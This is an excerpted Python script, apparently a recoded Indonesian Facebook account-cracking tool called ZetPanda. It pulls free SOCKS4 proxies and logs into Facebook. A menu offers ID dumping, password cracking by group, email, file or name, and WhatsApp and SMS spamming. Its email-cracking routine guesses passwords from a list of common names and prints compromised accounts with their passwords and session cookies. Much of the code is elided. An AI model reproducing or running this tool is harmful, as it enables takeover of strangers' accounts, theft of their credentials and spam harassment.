...
from concurrent.futures import ThreadPoolExecutor as ZetPanda 
...
sys.stdout.write('\x1b]2; ANS | Aldo NEVERSURENDERR\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari ALDO NEVERSURENDER');exit()
...
______ _____ ___ ______ ___ ______ 
 ...
 | |_) | |_) || | \ \ / / _ \ | |  
 |  __/|  _ < | |  \ V / ___ \| |  
 |_|   |_| \_\___|  \_/_/   \_\_|                                                                           RECODE : ALDO NEVERSURENDER            
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n [+] Login Berhasil | python ZetPanda.py");followdong()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(panel(f"[bold white]Follow ig:Zet.panda14",width=90,title=f"[bold green]Thanks To",style=f"bold white"))
	...
	_____ALDO___xd____ = input(f' [+] Pilih Menu Crack : ')
	if _____ALDO___xd____ in ['1','01']:
		brayen_dump()
	elif _____ALDO___xd____ in ['2','02']:
		dump_massal()
	elif _____ALDO___xd____ in ['3','03']:
		crack_group()
	elif _____ALDO___xd____ in ['4','04']:
		crack_email()
	elif _____ALDO___xd____ in ['5','05']:
		crack_file()
	elif _____ALDO___xd____ in ['6','06']:
		crack_nama()
	elif _____ALDO___xd____ in ['7','07']:
		pengikut()
	elif _____ALDO___xd____ in ['8','08']:
		komen()
	elif _____ALDO___xd____ in ['9','09']:
		file_cp()
	elif _____ALDO___xd____ in ['10']:
		result()
	elif _____ALDO___xd____ in ['11']:
		siu()
	elif _____ALDO___xd____ in ['12']:
		spam_wa()
	elif _____ALDO___xd____ in ['13']:
		spam_sms()
	elif _____ALDO___xd____ in ['14']:
		dumpid()
	elif _____ALDO___xd____ in ['15']:
...
def crack_email():
	...
	blk = ['tika','milla','Aldo','gabriel','lala','cans','nayla','pandi','miftah','kurnia','sinta','nadia','gadis','anggun','amoy','anna']
	global ok , cp
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='ZetPanda-CP')
					cetak(statuscp1)
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='ZetPanda-OK')
					cetak(statusok1)
